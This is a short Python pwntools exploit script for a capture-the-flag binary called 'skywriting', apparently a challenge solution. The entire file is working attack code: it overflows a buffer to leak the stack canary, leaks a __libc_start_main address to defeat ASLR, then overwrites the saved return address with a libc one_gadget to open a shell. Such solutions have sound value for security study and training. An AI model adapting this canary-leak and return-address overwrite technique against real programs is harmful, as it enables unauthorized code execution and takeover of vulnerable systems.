from pwn import *

elf = ELF("./skywriting")
libc = elf.libc

if args.GDB:
    p = gdb.debug(elf.path, gdbscript="start")
else:
    p = process(elf.path)

libc.symbols['one_gadget'] = 0x4f322

CANARY_PADDING = 136
LIBC_START_MAIN_PLUS_231 = 151
RIP_PADDING = 152

with log.progress("leaking canary"):
    p.sendline("1")
    p.recvuntil("shot: ")
    p.sendline(flat(length=CANARY_PADDING))
    p.recvline()
    data = p.recv()[0:7]
    canary = u64(data.rjust(8,"\0"))
    log.info("canary: %s" % hex(canary))

with log.progress("leaking libc base"):
    p.sendline(flat(length=LIBC_START_MAIN_PLUS_231))
    p.recvline()
    libc_start_main = u64(p.recv()[0:6].ljust(8, '\0')) - 231
    libc.address = libc_start_main - libc.symbols["__libc_start_main"]

    log.info("libc_start-main: %s" % hex(libc_start_main))
    log.info("libc base: %s" % hex(libc.address))

with log.progress("poping shell"):
    payload = flat(length=CANARY_PADDING)
    payload += p64(canary)
    payload += "A"*(RIP_PADDING - len(payload))
    payload += p64(libc.symbols['one_gadget'])
    p.sendline(payload)
    p.recv()
    p.sendline("notflag{a_cloud_is_just_someone_elses_computer}\n\x00")

p.interactive()
